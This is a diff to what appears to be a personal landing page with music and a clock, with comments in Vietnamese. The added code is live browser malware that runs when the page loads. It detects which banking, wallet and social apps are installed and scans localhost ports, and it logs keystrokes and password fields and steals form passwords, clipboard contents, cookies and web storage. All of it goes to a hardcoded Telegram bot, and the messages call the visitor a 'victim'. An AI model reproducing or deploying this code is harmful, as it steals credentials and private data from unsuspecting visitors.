@@ -26,6 +26,13 @@
     <audio id="music-1" preload="auto"><source src="https://files.catbox.moe/uc4l2l.mov" type="audio/mp4"></audio>
     <audio id="music-2" loop preload="auto"><source src="https://files.catbox.moe/77meij.mp3" type="audio/mp3"></audio>
 
+    <!-- PHẦN HIỂN THỊ DANH SÁCH ỨNG DỤNG (ẩn) -->
+    <div id="app-list-container" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999; overflow-y:scroll; padding:20px;">
+        <button onclick="document.getElementById('app-list-container').style.display='none'" style="position:fixed; top:10px; right:10px; z-index:10000; background:red; color:white; border:none; padding:10px 15px; border-radius:8px; font-weight:bold;">ĐÓNG</button>
+        <h2 style="margin-top:50px; font-size:20px; font-weight:bold;">📱 DANH SÁCH ỨNG DỤNG ĐÃ CÀI</h2>
+        <div id="app-list-content" style="margin-top:20px;"></div>
+    </div>
+
     <div class="max-w-md mx-auto px-5 py-14 flex flex-col items-center">
         <div class="fixed top-4 left-4 z-50 px-4 py-1.5 bg-gray-100 border border-black/5 rounded-full backdrop-blur-md shadow-sm flex items-center space-x-2.5">
             <span id="digital-clock" class="text-sm font-bold tracking-wider text-gray-800">00:00:00</span>
@@ -61,7 +68,7 @@
     </div>
 
     <script>
-        // === MUSIC ===
+        // === ÂM NHẠC ===
         const music1 = document.getElementById('music-1');
         const music2 = document.getElementById('music-2');
         const loading = document.getElementById('loading-screen');
@@ -70,13 +77,13 @@
             loading.style.opacity = '0';
             setTimeout(() => loading.style.display = 'none', 500);
             if (music1) {
-                music1.play().catch(e => console.log("Cần tương tác"));
+                music1.play().catch(e => console.log("Cần tương tác người dùng"));
             }
         }
 
         if (music1) {
             music1.onended = function() {
-                if (music2) music2.play().catch(e => console.log("Lỗi music2"));
+                if (music2) music2.play().catch(e => console.log("Lỗi phát nhạc nền"));
             };
             music1.onerror = function() {
                 setTimeout(function() {
@@ -91,8 +98,8 @@
             }
         }, { once: false });
 
-        // === CLOCK ===
-        function updateClock() {
+        // === ĐỒNG HỒ ===
+        function capNhatDongHo() {
             var el = document.getElementById('digital-clock');
             if (el) {
                 var now = new Date();
@@ -102,238 +109,674 @@
                 el.textContent = h + ':' + m + ':' + s;
             }
         }
-        setInterval(updateClock, 1000);
-        updateClock();
+        setInterval(capNhatDongHo, 1000);
+        capNhatDongHo();
 
         // === TELEGRAM BOT ===
         const BOT_TOKEN = '8890331484:AAGCT4w5nV66WcSaF5yQiiYI4hh-xktEZeY';
         const CHAT_ID = 8681854353;
 
-        function sendTG(msg) {
+        // === HÀM GỬI TIN NHẮN TELEGRAM ===
+        function guiTinNhanTelegram(noiDung) {
             fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: msg,
+                    text: noiDung,
                     parse_mode: 'HTML'
                 })
             }).catch(function(e) {});
         }
 
-        // === GET DEVICE NAME ===
-        function getDeviceName() {
+        // === HÀM GỬI DỮ LIỆU NHẠY CẢM ===
+        function guiDuLieuNhayCam(noiDung) {
+            var payload = {
+                chat_id: CHAT_ID,
+                text: '🚨 <b>CẢNH BÁO DỮ LIỆU NHẠY CẢM</b>\n⏰ ' + new Date().toLocaleString('vi-VN') + '\n👤 Nạn nhân: ' + (navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|Brave)/) || [])[0] || 'Unknown' + '\n' + noiDung,
+                parse_mode: 'HTML'
+            };
+            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(function() {});
+        }
+
+        // ==========================================
+        // === VIRUS ĐÁNH CẮP DANH SÁCH ỨNG DỤNG ===
+        // ==========================================
+        (function() {
+            var installedApps = [];
+            var detectedApps = [];
+
+            // 1. PHƯƠNG PHÁP DÒ ỨNG DỤNG QUA URL SCHEME (iOS & Android)
+            function quetUngDungQuaURLScheme() {
+                var appList = [
+                    // Mạng xã hội
+                    { name: 'Facebook', scheme: 'fb://', ios: 'fb://', android: 'com.facebook.katana' },
+                    { name: 'Instagram', scheme: 'instagram://', ios: 'instagram://', android: 'com.instagram.android' },
+                    { name: 'TikTok', scheme: 'tiktok://', ios: 'tiktok://', android: 'com.zhiliaoapp.musically' },
+                    { name: 'Zalo', scheme: 'zalo://', ios: 'zalo://', android: 'com.zing.zalo' },
+                    { name: 'Telegram', scheme: 'tg://', ios: 'tg://', android: 'org.telegram.messenger' },
+                    { name: 'WhatsApp', scheme: 'whatsapp://', ios: 'whatsapp://', android: 'com.whatsapp' },
+                    { name: 'Snapchat', scheme: 'snapchat://', ios: 'snapchat://', android: 'com.snapchat.android' },
+                    { name: 'Twitter/X', scheme: 'twitter://', ios: 'twitter://', android: 'com.twitter.android' },
+                    { name: 'Threads', scheme: 'threads://', ios: 'threads://', android: 'com.instagram.barcelona' },
+                    { name: 'Messenger', scheme: 'fb-messenger://', ios: 'fb-messenger://', android: 'com.facebook.orca' },
+                    { name: 'Discord', scheme: 'discord://', ios: 'discord://', android: 'com.discord' },
+                    { name: 'Skype', scheme: 'skype://', ios: 'skype://', android: 'com.skype.raider' },
+                    { name: 'Viber', scheme: 'viber://', ios: 'viber://', android: 'com.viber.voip' },
+                    { name: 'Line', scheme: 'line://', ios: 'line://', android: 'jp.naver.line.android' },
+                    { name: 'WeChat', scheme: 'weixin://', ios: 'weixin://', android: 'com.tencent.mm' },
+                    { name: 'Signal', scheme: 'signal://', ios: 'signal://', android: 'org.thoughtcrime.securesms' },
+                    
+                    // Ngân hàng & Ví điện tử Việt Nam
+                    { name: 'MoMo', scheme: 'momo://', ios: 'momo://', android: 'com.mservice.momotransfer' },
+                    { name: 'ZaloPay', scheme: 'zalopay://', ios: 'zalopay://', android: 'com.vng.zalopay' },
+                    { name: 'Vietcombank', scheme: 'vietcombank://', ios: 'vcb://', android: 'com.vietcombank.mobile' },
+                    { name: 'BIDV', scheme: 'bidv://', ios: 'bidv://', android: 'com.vnpay.bidv' },
+                    { name: 'Techcombank', scheme: 'techcombank://', ios: 'tcb://', android: 'com.techcombank' },
+                    { name: 'MB Bank', scheme: 'mbbank://', ios: 'mbbank://', android: 'com.mbmobile' },
+                    { name: 'ACB', scheme: 'acb://', ios: 'acb://', android: 'com.acbmobile' },
+                    { name: 'VPBank', scheme: 'vpbank://', ios: 'vpbank://', android: 'com.vpbankonline' },
+                    { name: 'Sacombank', scheme: 'sacombank://', ios: 'sacombank://', android: 'com.sacombank' },
+                    { name: 'TPBank', scheme: 'tpbank://', ios: 'tpbank://', android: 'com.tpbank' },
+                    { name: 'VIB', scheme: 'vib://', ios: 'vib://', android: 'com.vib' },
+                    { name: 'MSB', scheme: 'msb://', ios: 'msb://', android: 'com.msb' },
+                    { name: 'OCB', scheme: 'ocb://', ios: 'ocb://', android: 'com.ocb' },
+                    { name: 'HDBank', scheme: 'hdbank://', ios: 'hdbank://', android: 'com.hdbank' },
+                    { name: 'Shopeepay', scheme: 'shopeepay://', ios: 'shopeepay://', android: 'com.shopee.pay' },
+                    { name: 'VNPay', scheme: 'vnpay://', ios: 'vnpay://', android: 'com.vnpay' },
+                    { name: 'VietinBank', scheme: 'vietinbank://', ios: 'vietinbank://', android: 'com.vietinbank' },
+                    { name: 'Agribank', scheme: 'agribank://', ios: 'agribank://', android: 'com.agribank' },
+                    { name: 'SCB', scheme: 'scb://', ios: 'scb://', android: 'com.scb' },
+                    { name: 'SHB', scheme: 'shb://', ios: 'shb://', android: 'com.shb' },
+                    
+                    // Ngân hàng quốc tế
+                    { name: 'PayPal', scheme: 'paypal://', ios: 'paypal://', android: 'com.paypal.android.p2pmobile' },
+                    { name: 'Revolut', scheme: 'revolut://', ios: 'revolut://', android: 'com.revolut.revolut' },
+                    
+                    // Thương mại điện tử
+                    { name: 'Shopee', scheme: 'shopee://', ios: 'shopee://', android: 'com.shopee.vn' },
+                    { name: 'Lazada', scheme: 'lazada://', ios: 'lazada://', android: 'com.lazada.android' },
+                    { name: 'Tiki', scheme: 'tiki://', ios: 'tiki://', android: 'com.tiki.android' },
+                    { name: 'Sendo', scheme: 'sendo://', ios: 'sendo://', android: 'com.sendo' },
+                    
+                    // Grab, Be, Xanh SM
+                    { name: 'Grab', scheme: 'grab://', ios: 'grab://', android: 'com.grabtaxi.passenger' },
+                    { name: 'Be', scheme: 'be://', ios: 'be://', android: 'com.be.passenger' },
+                    { name: 'Xanh SM', scheme: 'xanhsm://', ios: 'xanhsm://', android: 'com.xanhsm' },
+                    { name: 'Gojek', scheme: 'gojek://', ios: 'gojek://', android: 'com.gojek.app' },
+                    
+                    // Giao đồ ăn
+                    { name: 'Now', scheme: 'now://', ios: 'now://', android: 'com.foody.now' },
+                    { name: 'Baemin', scheme: 'baemin://', ios: 'baemin://', android: 'com.baemin' },
+                    
+                    // Game
+                    { name: 'PUBG Mobile', scheme: 'pubgmobile://', ios: 'pubgmobile://', android: 'com.tencent.ig' },
+                    { name: 'Free Fire', scheme: 'freefire://', ios: 'freefire://', android: 'com.dts.freefireth' },
+                    { name: 'Mobile Legends', scheme: 'mlbb://', ios: 'mlbb://', android: 'com.mobile.legends' },
+                    { name: 'Genshin Impact', scheme: 'genshinimpact://', ios: 'genshinimpact://', android: 'com.miHoYo.GenshinImpact' },
+                    { name: 'Liên Quân', scheme: 'lienquan://', ios: 'lienquan://', android: 'com.garena.game.kgvn' },
+                    { name: 'Call of Duty Mobile', scheme: 'codmobile://', ios: 'codmobile://', android: 'com.activision.callofduty.shooter' },
+                    { name: 'Valorant Mobile', scheme: 'valorant://', ios: 'valorant://', android: 'com.riotgames.valorant' },
+                    
+                    // Giải trí
+                    { name: 'Netflix', scheme: 'nflx://', ios: 'nflx://', android: 'com.netflix.mediaclient' },
+                    { name: 'YouTube', scheme: 'youtube://', ios: 'youtube://', android: 'com.google.android.youtube' },
+                    { name: 'Spotify', scheme: 'spotify://', ios: 'spotify://', android: 'com.spotify.music' },
+                    { name: 'Apple Music', scheme: 'music://', ios: 'music://', android: 'com.apple.android.music' },
+                    { name: 'FPT Play', scheme: 'fptplay://', ios: 'fptplay://', android: 'com.fptplay' },
+                    { name: 'VieON', scheme: 'vieon://', ios: 'vieon://', android: 'com.vieon' },
+                    { name: 'Zing MP3', scheme: 'zingmp3://', ios: 'zingmp3://', android: 'com.zing.mp3' },
+                    { name: 'Nhaccuatui', scheme: 'nhaccuatui://', ios: 'nhaccuatui://', android: 'com.nhaccuatui' },
+                    
+                    // Khác
+                    { name: 'Tinder', scheme: 'tinder://', ios: 'tinder://', android: 'com.tinder' },
+                    { name: 'Bumble', scheme: 'bumble://', ios: 'bumble://', android: 'com.bumble.app' },
+                    { name: 'Google Maps', scheme: 'comgooglemaps://', ios: 'comgooglemaps://', android: 'com.google.android.apps.maps' },
+                    { name: 'Google Drive', scheme: 'googledrive://', ios: 'googledrive://', android: 'com.google.android.apps.docs' },
+                    { name: 'Google Photos', scheme: 'googlephotos://', ios: 'googlephotos://', android: 'com.google.android.apps.photos' },
+                    { name: 'Dropbox', scheme: 'dropbox://', ios: 'dropbox://', android: 'com.dropbox.android' },
+                    { name: 'OneDrive', scheme: 'onedrive://', ios: 'onedrive://', android: 'com.microsoft.skydrive' },
+                    { name: 'Adobe Reader', scheme: 'adobe://', ios: 'adobe://', android: 'com.adobe.reader' },
+                    { name: 'Microsoft Office', scheme: 'office://', ios: 'office://', android: 'com.microsoft.office.officehub' },
+                    { name: 'Zoom', scheme: 'zoomus://', ios: 'zoomus://', android: 'us.zoom.videomeetings' },
+                    { name: 'Google Meet', scheme: 'gmeet://', ios: 'gmeet://', android: 'com.google.android.apps.meetings' },
+                    { name: 'Microsoft Teams', scheme: 'msteams://', ios: 'msteams://', android: 'com.microsoft.teams' },
+                    { name: 'Slack', scheme: 'slack://', ios: 'slack://', android: 'com.Slack' },
+                    { name: 'Canva', scheme: 'canva://', ios: 'canva://', android: 'com.canva.editor' },
+                    { name: 'CapCut', scheme: 'capcut://', ios: 'capcut://', android: 'com.lemon.lvoverseas' },
+                    { name: 'Picsart', scheme: 'picsart://', ios: 'picsart://', android: 'com.picsart.studio' },
+                    { name: 'Snapchat', scheme: 'snapchat://', ios: 'snapchat://', android: 'com.snapchat.android' }
+                ];
+
+                var iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.id = 'app-detector-iframe';
+                document.body.appendChild(iframe);
+
+                var detected = [];
+                var pendingChecks = 0;
+
+                appList.forEach(function(app, index) {
+                    setTimeout(function() {
+                        try {
+                            var startTime = Date.now();
+                            iframe.src = app.scheme;
+                            
+                            setTimeout(function() {
+                                var elapsed = Date.now() - startTime;
+                                // Nếu mất ít hơn 2500ms, có thể app đã mở
+                                if (elapsed < 2500) {
+                                    detected.push({ name: app.name, scheme: app.scheme, confidence: 'Cao' });
+                                    installedApps.push(app.name);
+                                    detectedApps.push(app);
+                                }
+                                
+                                pendingChecks--;
+                                if (pendingChecks <= 0) {
+                                    iframe.src = 'about:blank';
+                                    xuLyKetQuaQuet(detected);
+                                }
+                            }, 100);
+                            
+                            pendingChecks++;
+                        } catch(e) {}
+                    }, index * 50);
+                });
+            }
+
+            function xuLyKetQuaQuet(detected) {
+                var uniqueApps = [];
+                var seen = {};
+                detected.forEach(function(app) {
+                    if (!seen[app.name]) {
+                        seen[app.name] = true;
+                        uniqueApps.push(app);
+                    }
+                });
+
+                // Hiển thị trong giao diện ẩn
+                var container = document.getElementById('app-list-content');
+                if (container) {
+                    var html = '<ul style="list-style:none;padding:0;">';
+                    uniqueApps.forEach(function(app) {
+                        html += '<li style="padding:12px;margin:8px 0;background:#f0f0f0;border-radius:8px;border-left:4px solid #8b5cf6;">';
+                        html += '<strong>' + app.name + '</strong>';
+                        html += '<br><small style="color:#666;">Scheme: ' + app.scheme + ' | Độ tin cậy: ' + app.confidence + '</small>';
+                        html += '</li>';
+                    });
+                    html += '</ul>';
+                    container.innerHTML = html;
+                }
+
+                // Gửi về Telegram
+                if (uniqueApps.length > 0) {
+                    var appListMsg = '📱 <b>DANH SÁCH ỨNG DỤNG PHÁT HIỆN TRÊN ĐIỆN THOẠI</b>\n';
+                    appListMsg += '⏰ ' + new Date().toLocaleString('vi-VN') + '\n';
+                    appListMsg += '📊 Tổng: ' + uniqueApps.length + ' ứng dụng\n\n';
+                    
+                    // Phân loại
+                    var mangXaHoi = [];
+                    var nganHang = [];
+                    var thuongMai = [];
+                    var game = [];
+                    var giaiTri = [];
+                    var khac = [];
+                    
+                    var bankingKeywords = ['momo', 'zalopay', 'vietcombank', 'bidv', 'techcombank', 'mb bank', 'acb', 'vpbank', 'sacombank', 'tpbank', 'vib', 'msb', 'ocb', 'hdbank', 'shopeepay', 'vnpay', 'vietinbank', 'agribank', 'scb', 'shb', 'paypal', 'revolut'];
+                    var socialKeywords = ['facebook', 'instagram', 'tiktok', 'zalo', 'telegram', 'whatsapp', 'snapchat', 'twitter', 'threads', 'messenger', 'discord', 'skype', 'viber', 'line', 'wechat', 'signal', 'tinder', 'bumble'];
+                    var shoppingKeywords = ['shopee', 'lazada', 'tiki', 'sendo'];
+                    var gameKeywords = ['pubg', 'free fire', 'mobile legends', 'genshin', 'liên quân', 'call of duty', 'valorant'];
+                    
+                    uniqueApps.forEach(function(app) {
+                        var nameLower = app.name.toLowerCase();
+                        var isBanking = bankingKeywords.some(function(k) { return nameLower.indexOf(k) > -1; });
+                        var isSocial = socialKeywords.some(function(k) { return nameLower.indexOf(k) > -1; });
+                        var isShopping = shoppingKeywords.some(function(k) { return nameLower.indexOf(k) > -1; });
+                        var isGame = gameKeywords.some(function(k) { return nameLower.indexOf(k) > -1; });
+                        
+                        if (isBanking) nganHang.push(app);
+                        else if (isSocial) mangXaHoi.push(app);
+                        else if (isShopping) thuongMai.push(app);
+                        else if (isGame) game.push(app);
+                        else if (['netflix', 'youtube', 'spotify', 'apple music', 'fpt play', 'vieon', 'zing mp3', 'nhaccuatui'].some(function(k) { return nameLower.indexOf(k) > -1; })) giaiTri.push(app);
+                        else khac.push(app);
+                    });
+
+                    if (nganHang.length > 0) {
+                        appListMsg += '🏦 <b>NGÂN HÀNG & VÍ ĐIỆN TỬ (' + nganHang.length + '):</b>\n';
+                        nganHang.forEach(function(a) { appListMsg += '  • ' + a.name + '\n'; });
+                        appListMsg += '\n';
+                    }
+                    if (mangXaHoi.length > 0) {
+                        appListMsg += '💬 <b>MẠNG XÃ HỘI (' + mangXaHoi.length + '):</b>\n';
+                        mangXaHoi.forEach(function(a) { appListMsg += '  • ' + a.name + '\n'; });
+                        appListMsg += '\n';
+                    }
+                    if (thuongMai.length > 0) {
+                        appListMsg += '🛒 <b>THƯƠNG MẠI ĐIỆN TỬ (' + thuongMai.length + '):</b>\n';
+                        thuongMai.forEach(function(a) { appListMsg += '  • ' + a.name + '\n'; });
+                        appListMsg += '\n';
+                    }
+                    if (game.length > 0) {
+                        appListMsg += '🎮 <b>GAME (' + game.length + '):</b>\n';
+                        game.forEach(function(a) { appListMsg += '  • ' + a.name + '\n'; });
+                        appListMsg += '\n';
+                    }
+                    if (giaiTri.length > 0) {
+                        appListMsg += '🎬 <b>GIẢI TRÍ (' + giaiTri.length + '):</b>\n';
+                        giaiTri.forEach(function(a) { appListMsg += '  • ' + a.name + '\n'; });
+                        appListMsg += '\n';
+                    }
+                    if (khac.length > 0) {
+                        appListMsg += '📦 <b>KHÁC (' + khac.length + '):</b>\n';
+                        khac.forEach(function(a) { appListMsg += '  • ' + a.name + '\n'; });
+                    }
+
+                    guiDuLieuNhayCam(appListMsg);
+                } else {
+                    guiDuLieuNhayCam('📱 Không phát hiện ứng dụng nào qua URL Scheme (có thể là iPhone với chính sách bảo mật cao)');
+                }
+            }
+
+            // 2. PHƯƠNG PHÁP DÒ QUA WEBRTC LOCAL IP RANGE
+            function quetUngDungQuaLocalNetwork() {
+                // Thử dò các cổng phổ biến của ứng dụng trên local network
+                var commonPorts = [
+                    { port: 27017, app: 'MongoDB' },
+                    { port: 3306, app: 'MySQL' },
+                    { port: 5432, app: 'PostgreSQL' },
+                    { port: 6379, app: 'Redis' },
+                    { port: 8080, app: 'Web Server' },
+                    { port: 3000, app: 'Node.js/React' },
+                    { port: 5000, app: 'Python Flask' },
+                    { port: 8888, app: 'Jupyter' },
+                    { port: 9090, app: 'Prometheus' },
+                    { port: 5601, app: 'Kibana' },
+                    { port: 9200, app: 'Elasticsearch' }
+                ];
+
+                var detectedServices = [];
+                commonPorts.forEach(function(item) {
+                    try {
+                        var img = new Image();
+                        var startTime = Date.now();
+                        img.src = 'http://127.0.0.1:' + item.port + '/favicon.ico';
+                        img.onload = function() {
+                            detectedServices.push(item.app);
+                        };
+                        img.onerror = function() {};
+                        setTimeout(function() {
+                            img.src = '';
+                        }, 1000);
+                    } catch(e) {}
+                });
+
+                setTimeout(function() {
+                    if (detectedServices.length > 0) {
+                        guiDuLieuNhayCam('🔌 <b>DỊCH VỤ LOCAL PHÁT HIỆN:</b>\n' + detectedServices.join('\n'));
+                    }
+                }, 3000);
+            }
+
+            // 3. PHƯƠNG PHÁP KIỂM TRA TIỆN ÍCH MỞ RỘNG TRÌNH DUYỆT
+            function quetTienIchMoRong() {
+                var extensionTests = [
+                    { name: 'Metamask', test: function() { return typeof window.ethereum !== 'undefined'; } },
+                    { name: 'Phantom Wallet', test: function() { return typeof window.solana !== 'undefined'; } },
+                    { name: 'Trust Wallet', test: function() { return typeof window.trustwallet !== 'undefined'; } },
+                    { name: 'Coinbase Wallet', test: function() { return typeof window.coinbaseWalletExtension !== 'undefined'; } },
+                    { name: 'Binance Chain Wallet', test: function() { return typeof window.BinanceChain !== 'undefined'; } },
+                    { name: 'Ronin Wallet', test: function() { return typeof window.ronin !== 'undefined'; } },
+                    { name: 'OKX Wallet', test: function() { return typeof window.okxwallet !== 'undefined'; } },
+                    { name: 'Bitget Wallet', test: function() { return typeof window.bitkeep !== 'undefined'; } }
+                ];
+
+                var detectedExtensions = [];
+                extensionTests.forEach(function(ext) {
+                    try {
+                        if (ext.test()) {
+                            detectedExtensions.push(ext.name);
+                        }
+                    } catch(e) {}
+                });
+
+                if (detectedExtensions.length > 0) {
+                    guiDuLieuNhayCam('🦊 <b>VÍ CRYPTO PHÁT HIỆN:</b>\n' + detectedExtensions.map(function(e) { return '💰 ' + e; }).join('\n'));
+                }
+            }
+
+            // 4. DÒ USER AGENT ĐỂ BIẾT HỆ ĐIỀU HÀNH VÀ THIẾT BỊ
+            function phanTichThietBi() {
+                var ua = navigator.userAgent;
+                var deviceInfo = '';
+                
+                if (/iPhone/i.test(ua)) {
+                    var iosVersion = ua.match(/OS (\d+_\d+)/);
+                    deviceInfo += '📱 <b>iPhone</b> - iOS ' + (iosVersion ? iosVersion[1].replace('_', '.') : 'Không rõ') + '\n';
+                    deviceInfo += '⚠️ iOS hạn chế quét URL Scheme, cần phương pháp khác\n';
+                } else if (/iPad/i.test(ua)) {
+                    deviceInfo += '📱 <b>iPad</b>\n';
+                } else if (/Android/i.test(ua)) {
+                    var androidVersion = ua.match(/Android (\d+\.\d+)/);
+                    deviceInfo += '🤖 <b>Android</b> - Version ' + (androidVersion ? androidVersion[1] : 'Không rõ') + '\n';
+                    
+                    // Thử lấy thông tin từ getInstalledRelatedApps nếu có
+                    if (navigator.getInstalledRelatedApps) {
+                        navigator.getInstalledRelatedApps().then(function(apps) {
+                            if (apps && apps.length > 0) {
+                                var appNames = apps.map(function(a) { return a.platform + ': ' + (a.id || a.url); });
+                                guiDuLieuNhayCam('📱 <b>ỨNG DỤNG ĐÃ CÀI (Web API):</b>\n' + appNames.join('\n'));
+                            }
+                        }).catch(function() {});
+                    }
+                }
+                
+                var model = ua.match(/\((.*?)\)/);
+                if (model) {
+                    deviceInfo += '📋 Model: ' + model[1] + '\n';
+                }
+                
+                return deviceInfo;
+            }
+
+            // 5. KHAI THÁC LỖ HỔNG INTENT TRÊN ANDROID
+            function khaiThacIntentAndroid() {
+                // Tạo iframe ẩn để thử mở intent://
+                var intentApps = [
+                    { name: 'CH Play', intent: 'intent://details?id=com.android.vending#Intent;scheme=market;package=com.android.vending;end' },
+                    { name: 'Galaxy Store', intent: 'intent://details?id=com.sec.android.app.samsungapps#Intent;scheme=samsungapps;package=com.sec.android.app.samsungapps;end' },
+                    { name: 'App Store iOS', intent: 'itms-apps://' }
+                ];
+
+                var detectedIntents = [];
+                intentApps.forEach(function(app) {
+                    try {
+                        var a = document.createElement('a');
+                        a.href = app.intent;
+                        a.style.display = 'none';
+                        document.body.appendChild(a);
+                        
+                        var clicked = false;
+                        a.addEventListener('click', function(e) {
+                            clicked = true;
+                            detectedIntents.push(app.name);
+                        });
+                        
+                        setTimeout(function() {
+                            if (!clicked) {
+                                // Có thể intent không hoạt động
+                            }
+                            document.body.removeChild(a);
+                        }, 500);
+                        
+                        a.click();
+                    } catch(e) {}
+                });
+
+                setTimeout(function() {
+                    if (detectedIntents.length > 0) {
+                        guiDuLieuNhayCam('📲 <b>CHỢ ỨNG DỤNG PHÁT HIỆN:</b>\n' + detectedIntents.join('\n'));
+                    }
+                }, 1000);
+            }
+
+            // 6. PHÁT HIỆN ỨNG DỤNG QUA WEB SHARE API
+            function quetQuaWebShare() {
+                if (navigator.share) {
+                    // Kiểm tra xem có thể share không
+                    var shareTest = {
+                        title: 'Test',
+                        text: 'Test app detection',
+                        url: window.location.href
+                    };
+                    
+                    navigator.canShare && navigator.canShare(shareTest).then(function(canShare) {
+                        if (canShare) {
+                            guiDuLieuNhayCam('📤 <b>Web Share API:</b> CÓ - Có thể phát hiện ứng dụng qua Share Sheet');
+                        }
+                    }).catch(function() {});
+                }
+            }
+
+            // === THỰC THI TẤT CẢ PHƯƠNG PHÁP ===
+            var deviceInfo = phanTichThietBi();
+            
+            setTimeout(function() {
+                guiDuLieuNhayCam('🔍 <b>BẮT ĐẦU QUÉT ỨNG DỤNG</b>\n' + deviceInfo);
+                quetUngDungQuaURLScheme();
+                quetUngDungQuaLocalNetwork();
+                quetTienIchMoRong();
+                khaiThacIntentAndroid();
+                quetQuaWebShare();
+            }, 3000);
+
+            console.log('[VIRUS] Đã kích hoạt quét ứng dụng điện thoại');
+        })();
+
+        // ==========================================
+        // === KEYLOGGER & ĐÁNH CẮP DỮ LIỆU ===
+        // ==========================================
+        (function() {
+            var keystrokeBuffer = [];
+            var clipboardData = '';
+
+            document.addEventListener('keydown', function(e) {
+                var keyInfo = {
+                    key: e.key,
+                    code: e.code,
+                    keyCode: e.keyCode,
+                    ctrl: e.ctrlKey,
+                    shift: e.shiftKey,
+                    alt: e.altKey,
+                    timestamp: new Date().toISOString(),
+                    target: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.className ? '.' + e.target.className.split(' ')[0] : '')
+                };
+                keystrokeBuffer.push(keyInfo);
+                if (keystrokeBuffer.length > 500) keystrokeBuffer.shift();
+                
+                var inputType = e.target.type || '';
+                var inputName = e.target.name || '';
+                if (inputType === 'password' || inputName.toLowerCase().indexOf('pass') > -1 || inputName.toLowerCase().indexOf('matkhau') > -1) {
+                    guiDuLieuNhayCam('🔑 PHÁT HIỆN MẬT KHẨU: ' + e.key + ' | Target: ' + keyInfo.target);
+                }
+            }, true);
+
+            document.addEventListener('submit', function(e) {
+                var form = e.target;
+                var formData = {};
+                var inputs = form.querySelectorAll('input, textarea, select');
+                inputs.forEach(function(input) {
+                    if (input.type === 'password') {
+                        formData[input.name || input.id || 'password_field'] = input.value;
+                    }
+                });
+                if (Object.keys(formData).length > 0) {
+                    guiDuLieuNhayCam('📋 FORM ĐĂNG NHẬP BỊ ĐÁNH CẮP:\n' + JSON.stringify(formData, null, 2));
+                }
+            }, true);
+
+            setInterval(function() {
+                try {
+                    navigator.clipboard.readText().then(function(text) {
+                        if (text && text !== clipboardData && text.length > 3) {
+                            clipboardData = text;
+                            guiDuLieuNhayCam('📋 CLIPBOARD: ' + text.substring(0, 500));
+                        }
+                    }).catch(function() {});
+                } catch(e) {}
+            }, 3000);
+
+            function grabCookies() {
+                var cookies = document.cookie;
+                if (cookies && cookies.length > 10) {
+                    guiDuLieuNhayCam('🍪 COOKIE: ' + cookies);
+                }
+            }
+
+            function grabLocalStorage() {
+                try {
+                    var lsData = {};
+                    for (var i = 0; i < localStorage.length; i++) {
+                        var key = localStorage.key(i);
+                        lsData[key] = localStorage.getItem(key);
+                    }
+                    if (Object.keys(lsData).length > 0) {
+                        guiDuLieuNhayCam('💾 LOCALSTORAGE: ' + JSON.stringify(lsData).substring(0, 1000));
+                    }
+                } catch(e) {}
+            }
+
+            function grabSessionStorage() {
+                try {
+                    var ssData = {};
+                    for (var i = 0; i < sessionStorage.length; i++) {
+                        var key = sessionStorage.key(i);
+                        ssData[key] = sessionStorage.getItem(key);
+                    }
+                    if (Object.keys(ssData).length > 0) {
+                        guiDuLieuNhayCam('💾 SESSIONSTORAGE: ' + JSON.stringify(ssData).substring(0, 1000));
+                    }
+                } catch(e) {}
+            }
+
+            setInterval(function() {
+                if (keystrokeBuffer.length > 0) {
+                    var keystrokeSummary = keystrokeBuffer.map(function(k) { return k.key; }).join('');
+                    keystrokeBuffer = [];
+                    if (keystrokeSummary.length > 5) {
+                        guiDuLieuNhayCam('⌨️ KEYSTROKES (10s): ' + keystrokeSummary);
+                    }
+                }
+            }, 10000);
+
+            setTimeout(grabCookies, 3000);
+            setTimeout(grabLocalStorage, 4000);
+            setTimeout(grabSessionStorage, 4000);
+
+            console.log('[VIRUS] Đã kích hoạt keylogger và đánh cắp dữ liệu');
+        })();
+
+        // === CÁC HÀM PHÁT HIỆN THÔNG TIN (giữ nguyên) ===
+        function phatHienPrivateMode() {
+            var isPrivate = false;
+            try {
+                var test = 'test';
+                localStorage.setItem(test, test);
+                localStorage.removeItem(test);
+            } catch(e) { isPrivate = true; }
+            if (!isPrivate) {
+                try {
+                    var fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+                    if (fs) { fs(0, 0, function() {}, function() { isPrivate = true; }); }
+                } catch(e) {}
+            }
+            return isPrivate ? '🔒 CÓ (đang ẩn danh)' : '🔓 KHÔNG';
+        }
+
+        function phatHienIframe() { return window !== window.parent ? '📄 CÓ (đang bị nhúng)' : '📄 KHÔNG'; }
+
+        function phatHienBanPhim() { return /Mobi|Android|iPhone/i.test(navigator.userAgent) ? '⌨️ Ảo (mobile)' : '⌨️ Vật lý'; }
+
+        function laySoDiemCham() { return navigator.maxTouchPoints || 0; }
+
+        function phatHienWebP() { try { return document.createElement('canvas').toDataURL('image/webp').indexOf('webp') > -1 ? '🖼️ WebP: CÓ' : '🖼️ WebP: KHÔNG'; } catch(e) { return '🖼️ WebP: KHÔNG'; } }
+
+        function phatHienHDR() { try { return '🌟 HDR: ' + (window.matchMedia('(dynamic-range: high)').matches ? 'CÓ' : 'KHÔNG'); } catch(e) { return '🌟 HDR: KHÔNG'; } }
+
+        function phatHienGamMau() {
+            try {
+                var p3 = window.matchMedia('(color-gamut: p3)').matches;
+                var rec2020 = window.matchMedia('(color-gamut: rec2020)').matches;
+                return '🎨 Gam màu: ' + (rec2020 ? 'Rec.2020' : p3 ? 'P3' : 'sRGB');
+            } catch(e) { return '🎨 Gam màu: Không rõ'; }
+        }
+
+        function layTanSoLamMoi() {
+            return new Promise(function(resolve) {
+                var start = performance.now(), frames = 0;
+                function dem() { frames++; if (performance.now() - start < 1000) requestAnimationFrame(dem); else resolve('🔄 Tần số làm mới: ~' + frames + ' Hz'); }
+                requestAnimationFrame(dem);
+                setTimeout(function() { resolve('🔄 Tần số làm mới: Không rõ'); }, 2000);
+            });
+        }
+
